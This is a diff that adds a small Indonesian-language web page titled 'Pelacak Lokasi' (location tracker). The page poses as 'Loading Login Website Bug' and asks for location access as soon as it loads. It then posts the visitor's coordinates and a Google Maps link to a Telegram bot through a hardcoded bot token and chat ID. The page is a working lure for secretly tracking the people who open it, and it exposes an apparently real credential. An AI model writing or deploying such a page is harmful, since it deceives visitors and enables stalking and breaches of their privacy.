@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Pelacak Lokasi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    #status {
+      font-size: 18px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔍 Loading Login Website Bug</h1>
+  <p id="status">Mohon izinkan akses lokasi untuk melanjutkan.</p>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8010512044:AAHRFXPRLG6-GoXJoBeAFH2YaAAlfYaMBac"; // Ganti dengan token bot asli
+    const TELEGRAM_CHAT_ID = "7859535520"; // Chat ID tujuan
+
+    function kirimKeTelegram(lat, lon) {
+      const pesan = `📍 Lokasi Pengunjung Website:\nLatitude: ${lat}\nLongitude: ${lon}\n\n🌐 <a href="https://maps.google.com/?q=${lat},${lon}">Lihat di Google Maps</a>`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: pesan,
+          parse_mode: "HTML"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("status").innerText = "✅ Lokasi berhasil dikirim ke Telegram.";
+        console.log("Sukses:", data);
+      })
+      .catch(error => {
+        document.getElementById("status").innerText = "❌ Gagal mengirim lokasi.";
+        console.error("Error:", error);
+      });
+    }
+
+    function ambilLokasi() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            document.getElementById("status").innerText = `📡 Lokasi didapatkan! Mengirim ke Telegram...`;
+            kirimKeTelegram(lat, lon);
+          },
+          (err) => {
+            document.getElementById("status").innerText = "⚠️ Gagal mendapatkan lokasi. Pastikan izin diberikan.";
+            console.error("Geolocation error:", err);
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "🚫 Browser tidak mendukung geolokasi.";
+      }
+    }
+
+    // Mulai ambil lokasi saat halaman dimuat
+    ambilLokasi();
+  </script>
+</body>
+</html>
